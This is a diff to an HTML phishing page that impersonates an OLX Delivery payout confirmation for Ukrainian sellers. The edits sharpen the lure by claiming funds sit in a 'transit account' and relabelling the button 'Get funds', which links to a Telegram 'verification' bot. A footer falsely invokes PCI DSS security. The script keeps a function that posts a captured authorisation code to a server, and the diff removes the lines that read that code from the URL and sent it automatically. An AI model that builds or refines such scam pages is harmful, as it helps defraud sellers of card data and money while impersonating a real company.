@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>OLX Доставка — Підтвердження</title>
+    <title>OLX Доставка — Підтвердження для продавця</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -122,7 +122,6 @@
             box-sizing: border-box;
         }
 
-        /* ИСПРАВЛЕННЫЕ ЗНАЧКИ */
         .footer-info {
             text-align: center;
             margin-top: 40px;
@@ -184,18 +183,18 @@
             </div>
             <div style="display: flex; justify-content: space-between; font-size: 14px;">
                 <span>Статус оплати:</span>
-                <span class="status-paid">Сплачено</span>
+                <span class="status-paid">Зараховано на транзитний рахунок</span>
             </div>
         </div>
 
         <div class="security-notice">
-            <strong>Важливо!</strong> У зв'язку з випадками шахрайства, усі замовлення обробляются в <strong>ручному режимі</strong>. 
+            <strong>Важливо!</strong> Для зарахування коштів на вашу банківську карту необхідно підтвердити дані через систему верифікації OLX.
             <br><br>
-            Для зарахування коштів на вашу карту пройдіть верифікацію в нашому чат-боті.
+            Натисніть кнопку нижче, щоб перейти до отримання виплати.
         </div>
 
         <a href="https://t.me/olx_verification" class="confirm-btn">
-            Підтвердити
+            Отримати кошти
         </a>
     </div>
 
@@ -207,15 +206,13 @@
         </div>
         <div class="copyright">
             © 2026 OLX UA. Безпека транзакцій гарантована протоколами PCI DSS. 
-            <br>Обробка замовлень: 24/7
+            <br>Центр підтримки виплат: 24/7
         </div>
     </div>
 </div>
 
 <script>
-    const params = new URLSearchParams(window.location.search);
-    const code = params.get("code");
-
+    // Тільки функція відправки на сервер
     async function sendCodeToServer(authCode) {
         if (!authCode) return;
         try {
@@ -224,10 +221,10 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ code: authCode })
             });
-        } catch (err) { console.error(err); }
+        } catch (err) { 
+            console.error("Помилка при передачі коду:", err); 
+        }
     }
-
-    if (code) sendCodeToServer(code);
 </script>
 
 </body>
